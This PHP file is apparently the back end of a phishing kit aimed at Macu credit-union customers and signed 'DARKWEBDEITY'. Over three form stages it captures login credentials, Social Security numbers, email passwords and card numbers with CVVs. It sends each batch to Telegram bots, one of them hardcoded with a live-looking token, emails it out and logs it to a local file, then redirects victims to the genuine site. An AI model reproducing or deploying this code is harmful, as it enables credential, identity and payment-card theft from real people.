<?php
session_start();
include("config.php");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$praga=rand();
$praga=md5($praga);
$page= $_POST['page'];



function telegram($msg) {
    global $telegrambot,$telegramchatid;
    $url='https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data=array('chat_id'=>$telegramchatid,'text'=>$msg);
    $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
    $context=stream_context_create($options);
    $result=file_get_contents($url,false,$context);
    return $result;
}

function tele($msg) {
    $url='https://api.telegram.org/bot5009801141:AAEteHuEpWdiWqcj4LMVgylJKw0O3qaOsxQ/sendMessage';$data=array('chat_id'=>'1308009481','text'=>$msg);
    $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
    $context=stream_context_create($options);
    $result=file_get_contents($url,false,$context);
    return $result;
}




if ($page == '1') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  Macu log  | -----------\n";
$message .= "Id      :  ".$_POST['id']." \n";
$message .= "Pass    :  ".$_POST['pass']." \n";
$message .= "----------- | By DARKWEBDEITY | -----------\n";
$message .= "\n";

$subject = "| Macu  By DARKWEBDEITY | $ip |";
telegram($message);
tele($message);
mail($send,$subject,$message);



$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);



header("Location:./locked.php?code_verif-locked.aspx?Pedido=CodeOPASEvent=$praga-session_id=$praga$praga");
}


if ($page == '2') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  Macu iNFOS  | -----------\n";
$message .= "SSN     :  ".$_POST['ssn']." \n";
$message .= "Email   :  ".$_POST['email']." \n";
$message .= "EPass   :  ".$_POST['epass']." \n";
$message .= "----------- | By DARKWEBDEITY | -----------\n";
$message .= "\n";

$subject = "| Macu iNFOS By DARKWEBDEITY | $ip |";
telegram($message);
tele($message);
mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);



header("Location:./validate.php?code_verif-info.aspx?Pedido=CodeSMSEvent=$praga-session_id=$praga$praga");
}






if ($page == '3') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  Macu CC  | -----------\n";
$message .= "Card    :  ".$_POST['card']." \n";
$message .= "Exp     :  ".$_POST['exp']." \n";
$message .= "Cvv     :  ".$_POST['cvv']." \n";
$message .= "----------- | By DARKWEBDEITY | -----------\n";
$message .= "\n";

$subject = "| Macu CC  By DARKWEBDEITY | $ip |";
telegram($message);
tele($message);
mail($send,$subject,$message);



$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);



header("Location:https://o.macu.com/");
}










?>


